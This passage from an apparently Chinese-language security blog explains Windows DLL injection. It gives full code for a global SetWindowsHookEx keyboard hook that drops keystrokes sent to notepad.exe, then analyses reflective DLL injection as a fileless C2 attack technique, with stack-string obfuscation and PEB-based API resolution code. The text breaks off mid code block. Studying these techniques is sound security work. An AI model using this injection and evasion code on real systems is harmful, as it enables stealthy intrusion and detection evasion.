class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">int</span>       idHook,      <span class="comment">//hook type 钩子类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HOOKPROC  lpfn,        <span class="comment">//hook procedure 回调函数地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HINSTANCE hMod,        <span class="comment">//hook procedure所属的dll句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   DWORD     dwThreadId   <span class="comment">//想要挂钩的线程PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数表征钩子的类型，但钩子的类型是微软规定好的，你只能选一种，自己不能乱写</p><p>第二个参数是钩子执行程序，即当钩子勾到所需信息时运行的程序</p><p>第三个参数是要注入的dll句柄</p><p>第四个参数是想要挂载的线程ID，如果该参数为0，则表明钩子是一个全局钩子</p><p>HHOOK：返回值，钩子句柄，需要保留，等不使用钩子时通过UnhookWindowsHookEx函数卸载钩子。</p><p>idHook：钩子的拦截消息类型，选择钩子程序的拦截范围，具体值参考文章结尾的消息类型。</p><p>Lpfn：消息的回调函数地址，钩子子程的地址指针，一般是填函数名。</p><p>hMod：钩子函数所在的实例的句柄。对于线程钩子，该参数为NULL；对于系统钩子，该参数为钩子函数所在的DLL句柄。在dll中可通过AfxInitExtensionModule(MousehookDLL, hInstance)获得DLL句柄。</p><p>dwThreadId：钩子所监视的线程的线程号，可通过GetCurrentThreadId()获得线程号。对于全局钩子，该参数为NULL(或0)。</p><p>使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS会将相关的DLL文件强制注入相应的进程，然后调用注册的钩子过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216175809205.png" alt="image-20260216175809205"></p><p>KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll后使用SetWindowsHookEx()安装键盘钩子；若其他进程（如图中所示）发生键盘输入事件，OS就会强制将KeyHook.dll加载到像一个进程的内存，然后调用KeyboardProc()函数。</p><p>keyHook.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KeyHook.cpp</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME <span class="string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span>&#123;</span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )&#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line"><span class="keyword">if</span>(!(lParam &amp; <span class="number">0x80000000</span>) )&#123;</span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="comment">// _stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span></span><br><span class="line"><span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//在C++中调用C的库文件，用extern &quot;C&quot;告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line"><span class="comment">//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span>&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(g_hHook)&#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>因为要生成的是KeyHook.dll文件，因而在开始创建项目时应先选择Win 32控制台应用程序</p><p>当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS都会强制将KeyHook.dll注入相应的进程中。</p><p>KeyboardProc()函数中发生键盘输入事件时，会比较当前进程名称和“notepad.exe”是否一致，若一致则返回1，终止KeyboardProc()函数，即截获并删除消息，从而实现对notepad.exe程序的键盘输入事件进行钩取并截获删除、键盘消息不能传递到notepad.exe的消息队列中。</p><p>KeyboardProc()函数定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> code,//HC_ACTION(<span class="number">0</span>)</span>, HC_NOREMOVE(<span class="number">3</span>)</span><br><span class="line">    WPARAM wParam,<span class="comment">//virtual-key code</span></span><br><span class="line">    LPARAM lParam<span class="comment">//extra information</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中wParam指用户按下的键盘按键的虚拟键值。</p><p>HookMain.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HookMain</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="comment">//Console Input/Output，定义了通过控制台进行数据输入和数据输出的函数</span></span><br><span class="line"><span class="comment">//主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;conio.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义一些常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME <span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTART <span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTOP <span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义两个参数为空、返回值为void即没有的函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//定义及初始化句柄变量和函数指针</span></span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTART HookStart = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTOP HookStop = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//加载KeyHook.dll</span></span><br><span class="line">hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//若加载不成功，则输出错误信息</span></span><br><span class="line"><span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]无法加载%s [%d]\n&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获取导出函数地址</span></span><br><span class="line">HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//开始钩取</span></span><br><span class="line">HookStart();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//直至用户输入“q”退出钩取</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]等待输入 &#x27;q&#x27; 来停止钩取...\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>( _getch() != <span class="string">&#x27;q&#x27;</span> );</span><br><span class="line"> </span><br><span class="line"><span class="comment">//终止钩取</span></span><br><span class="line">HookStop();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//卸载KeyHook.dll</span></span><br><span class="line">FreeLibrary(hDll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装好键盘钩子后，无论在哪个进程中，只要发生了键盘输入事件，OS就会强制将<strong>KeyHook.dll</strong>注入到进程中，加载了KeyHook.dll的进程，发生键盘事件时会首先调用执行**KeyHook.KetyboardProc()**。</p><p>KetyboardProc()函数中发生键盘输入事件时，会比较当前进程的名称与“notepad.exe”是否相同，相同返回1，终止KetyboardProc()函数，意味着截获并删除了消息，这样键盘消息就不会传递到notepad.exe程序的消息队列。</p><h1 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h1><p>其他注入方式<a href="https://blog.csdn.net/fuhanghang/article/details/83795769">多种DLL注入技术原理介绍_dll注入器-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p><p><a href="https://www.freebuf.com/articles/endpoint/422011.html">反射DLL注入技术深度解析与实战 - FreeBuf网络安全行业门户</a></p><p><a href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p><p>普通DLL注入通过操作目标进程内存空间，强制加载外部DLL文件。核心流程如下：</p><ol><li><strong>获取目标进程句柄</strong>：<code>OpenProcess</code></li><li><strong>分配内存写入DLL路径</strong>：<code>VirtualAllocEx</code>+ <code>WriteProcessMemory</code></li><li><strong>创建远程线程执行加载</strong>：<code>CreateRemoteThread</code>调用<code>LoadLibrary</code></li><li><strong>清理资源</strong>：释放内存并关闭句柄</li></ol><p><strong>技术局限</strong>：</p><ul><li>依赖<code>LoadLibrary</code>等敏感API</li><li>需要磁盘DLL文件落地</li><li>容易被行为分析检测</li></ul><p>普通 DLL 注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程调用 LoadLibrary</span><br></pre></td></tr></table></figure><p>反射 DLL 注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让目标进程执行自定义 PE 加载器</span><br></pre></td></tr></table></figure><blockquote><p>PE Loader当双击一个 exe 时真正发生的是,ntdll.dll 里的 Loader</p><p>具体函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LdrLoadDll</span><br><span class="line">LdrpLoadDll</span><br></pre></td></tr></table></figure><p>这套机制统称为：PE Loader</p></blockquote><p>当系统加载一个 DLL 时，Loader 会做下面这些事：</p><p>① 分配内存</p><p>根据 PE 头里的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SizeOfImage</span><br><span class="line">ImageBase</span><br></pre></td></tr></table></figure><p>在内存中分配一块空间。</p><p>② 复制节区（Sections）</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.data</span><br><span class="line">.rdata</span><br></pre></td></tr></table></figure><p>把文件里的节区拷贝到内存中对应位置。</p><p>③ 处理重定位（Relocation）</p><p>如果 DLL 没加载到默认 ImageBase：就根据重定位表修正地址</p><p>④ 修复导入表（IAT）</p><p>如果你的 DLL 里有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBox()</span><br><span class="line">CreateFile()</span><br></pre></td></tr></table></figure><p>它会：找到 user32.dll kernel32.dll获取函数地址填入 IAT</p><p>⑤ 调用入口点</p><p>对于 DLL：DllMain(DLL_PROCESS_ATTACH)</p><p>对于 EXE：EntryPoint()</p><p><strong>反射DLL注入原理</strong></p><p>copy from <a href="https://xz.aliyun.com/news/14076">反射DLL注入原理解析-先知社区</a></p><p>通过 DLL 内部的一个函数来自己把自己加载起来，这么说可能会有一点抽象，总之这个函数会负责解析DLL文件的头信息、导入函数的地址、处理重定位等初始化操作，先不用理解这个函数是怎么实现的，后面会细说，我们只需要将这个DLL文件写入目标进程的虚拟空间中，然后通过DLL的导出表找到这个ReflectiveLoader并调用它，我们的任务就完成了。</p><p>那么我们的任务就到了如何编写这个函数上面了，由于这个函数执行的时候 DLL 还没有被加载，这个函数的编写也会受到诸多限制，比如说无法正常使用全局变量，还有我们的函数必须编写成与地址无关的函数，就像 shellcode 那样，无论加载到了内存中的哪一个位置都要保证成功加载。</p><p>这个技术也是非常实用的，除了进行注入，我们在开发 c2 时也可以利用此技术实现无文件落地攻击。要理解这个技术需要丰富的 PE 知识</p><p>接下来要分析的项目是<a href="https://github.com/oldboy21/RflDllOb%EF%BC%8C%E5%AE%83%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BC%AA">https://github.com/oldboy21/RflDllOb，它实现了一个伪</a> c2 的无文件落地攻击，项目分成两个部分，一个是ReflectiveDLL，就是我们上面说的 dll，还有一个就是ReflectiveDLLInjector，它实现了从 url 下载ReflectiveDLL 并且注入到指定线程中，实现无文件落地攻击的技术。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215704375.png" alt="image-20260217215704375"></p><h2 id="ReflectiveDLL"><a href="#ReflectiveDLL" class="headerlink" title="ReflectiveDLL"></a>ReflectiveDLL</h2><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260217215852389.png" alt="image-20260217215852389"></p><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><p>反射DLL被当成一段裸内存写进目标进程,然后直接跳转到 ReflectiveLoader,在未知基址执行</p><p>也就是说：代码必须能在“任意地址”运行</p><p>这叫：Position Independent Code（位置无关代码）</p><p>写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char kernel32[] = &quot;kernel32.dll&quot;;</span><br></pre></td></tr></table></figure><p>编译器会把这个字符串放到 <code>.rdata</code> 或 <code>.data</code> 段,代码里使用的是绝对地址引用</p><blockquote><p>PE 文件里的绝对地址通常是：<strong>ImageBase + 偏移量</strong></p><p>如果 ImageBase 变了，那就必须重定位。</p><p>重定位，系统会：</p><ol><li>读取重定位表</li><li>找到所有“需要修正的地址”</li><li>把原地址 + (新基址 - 旧基址)算出来</li></ol><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新基址 = 0x20000000</span><br><span class="line">旧基址 = 0x10000000</span><br><span class="line">差值   = 0x10000000</span><br></pre></td></tr></table></figure></blockquote><p>在编译时编译器不知道你未来会加载到哪里，都会按ImageBase + 偏移来生成机器码。</p><p>正常 LoadLibrary 加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">系统 Loader：</span><br><span class="line">1️⃣ 分配目标内存（SizeOfImage）</span><br><span class="line">2️⃣ 拷贝节区</span><br><span class="line">3️⃣ 处理重定位</span><br><span class="line">4️⃣ 修复 IAT</span><br><span class="line">5️⃣ 调用 DllMain</span><br></pre></td></tr></table></figure><p>注意：重定位发生在代码执行之前</p><p>反射 DLL 的加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1️⃣ 把整个 DLL 文件当作“数据”</span><br><span class="line">    写入目标进程某块内存</span><br><span class="line"></span><br><span class="line">2️⃣ 直接跳转到 ReflectiveLoader（还在原始文件布局里）</span><br><span class="line"></span><br><span class="line">3️⃣ 由 ReflectiveLoader：</span><br><span class="line">    - 解析 PE 头</span><br><span class="line">    - 分配新内存</span><br><span class="line">    - 拷贝节区</span><br><span class="line">    - 处理重定位</span><br><span class="line">    - 修复 IAT</span><br><span class="line">    - 再跳到真正入口点</span><br></pre></td></tr></table></figure><p>类似shellcode</p><p>反射 DLL 不依赖系统 Loader,而系统 Loader 本来负责,现在不用 LoadLibrary 了,只能自己处理</p><p>首先我们在ReflectiveFunction 函数开头可以看到下面这样的声明，还记得我们在上面说的无法使用全局变量吗，这意味着我们所有的变量都必须是堆栈变量(全局变量会产生绝对地址，执行会出问题)。堆栈变量不会最终出现在编译的代码部分（需要重新定位的位置），但始终使用堆栈指针的相对偏移量进行寻址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WCHAR kernel32[] = &#123; L&#x27;K&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;n&#x27;, L&#x27;e&#x27;, L&#x27;l&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR ntdll[] = &#123; L&#x27;n&#x27;, L&#x27;t&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    WCHAR user32[] = &#123; L&#x27;U&#x27;, L&#x27;s&#x27;, L&#x27;e&#x27;, L&#x27;r&#x27;, L&#x27;3&#x27;, L&#x27;2&#x27;, L&#x27;.&#x27;, L&#x27;d&#x27;, L&#x27;l&#x27;, L&#x27;l&#x27;, L&#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualAlloc[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;c&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR virtualProtect[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;P&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR rtladdFunctionTable[] = &#123; &#x27;R&#x27;, &#x27;t&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;d&#x27;, &#x27;d&#x27;, &#x27;F&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;T&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR ntFlushInstructionCache[] = &#123; &#x27;N&#x27;, &#x27;t&#x27;, &#x27;F&#x27;, &#x27;l&#x27;, &#x27;u&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;I&#x27;, &#x27;n&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;C&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;h&#x27;, &#x27;e&#x27;, &#x27;\0&#x27; &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; &#x27;L&#x27;, &#x27;o&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;L&#x27;, &#x27;i&#x27;, &#x27;b&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;y&#x27;, &#x27;A&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure><p>像上面这样声明我们的字符串将使编译器在运行时将这些单个字符推送到堆栈上。因此，区别在于初始化风格，定义单个字符与使用字符串文本，前者产生堆栈分配的数组，而后者产生在可执行文件的初始化数据部分中分配的数组。</p><h3 id="获取所需系统-api"><a href="#获取所需系统-api" class="headerlink" title="获取所需系统 api"></a>获取所需系统 api</h3><p>反射&#x2F;手动映射早期阶段经常处于这种状态：</p><ul><li>IAT（导入表）可能还没修好（或者不想依赖它）</li><li>也不想显式调用 <code>GetProcAddress/LoadLibrary</code>（因为你自己要“当 loader”）</li><li>但又必须拿到一些基础 API（VirtualAlloc&#x2F;VirtualProtect&#x2F;LoadLibrary&#x2F;NtFlushInstructionCache…）才能继续往下做</li></ul><p>所以就需要一条自举路径</p><blockquote><p>从当前进程已加载模块列表里找到 kernel32&#x2F;ntdll,再手工解析它们的 PE 导出表，找到函数地址,遇到导出转发时再递归解析</p></blockquote><p>通过GPAR(GMHR(kernel32), virtualAlloc)这样的方式来获取系统 api，GMHR 是获取 dll 句柄的函数，GPAR 的功能是通过句柄获取对应导出表函数地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ((VA = (fnVirtualAlloc)GPAR(GMHR(kernel32), virtualAlloc)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(VP = (fnVirtualProtect)GPAR(GMHR(kernel32), virtualProtect)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(RAFT = (fnRtlAddFunctionTable)GPAR(GMHR(kernel32), rtladdFunctionTable)))</span><br><span class="line">        return FALSE;</span><br><span class="line">    if (!(FIC = (fnNtFlushInstructionCache)GPAR(GMHR(ntdll), ntFlushInstructionCache)))</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure><p>在 GMHR 函数中，我们通过 PEB 来获取想要获取的函数所在 dll 的句柄。（关于 peb 的知识可以看<a href="https://xz.aliyun.com/t/13556%EF%BC%89">https://xz.aliyun.com/t/13556）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 